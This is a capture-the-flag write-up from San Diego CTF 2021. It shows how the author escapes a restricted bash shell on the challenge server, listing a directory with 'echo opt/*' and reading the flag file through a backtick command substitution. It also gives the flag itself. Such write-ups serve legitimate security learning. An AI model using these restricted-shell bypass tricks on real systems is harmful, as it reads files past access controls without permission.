# __San Diego CTF 2021__ 
## _No flag for you_

## Information

**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
MISC | 453 | soska_nerealka

**Description:** 

> Welcome to the most restrictive shell ever, with only 2 semi-functional non-shell commands.
>
> Connect via: nc noflag.sdc.tf 1337

## Solution

Lets connect to the sever with netcat
```
from nclib import netcat

conn = netcat.Netcat(('noflag.sdc.tf', 1337))
print(conn.recvline())
```
It tells us that "There is no flag here." Is it true? Lets find out!

We cant just do
```
conn.sendline(b'ls /opt')
```
because connection returns
```
rbash$ ls: cannot open directory '/opt': Permission denied
```
So lets just google some alternatives for ls. And here it is!

```
conn.sendline(b'echo opt/*')
```
This echo works pretty like ls and permission wont stop us!

It returned to us: opt/flag-b01d7291b94feefa35e6.txt

So now we need to see what it contains. Can we do it again with echo? Lets google again...

Here it is:
```
conn.sendline(b'echo `<opt/flag-b01d7291b94feefa35e6.txt`')
```
We succesfully echoed our flag


> sdctf{1t'5_7h3_sh3ll_1n_4_shEll}
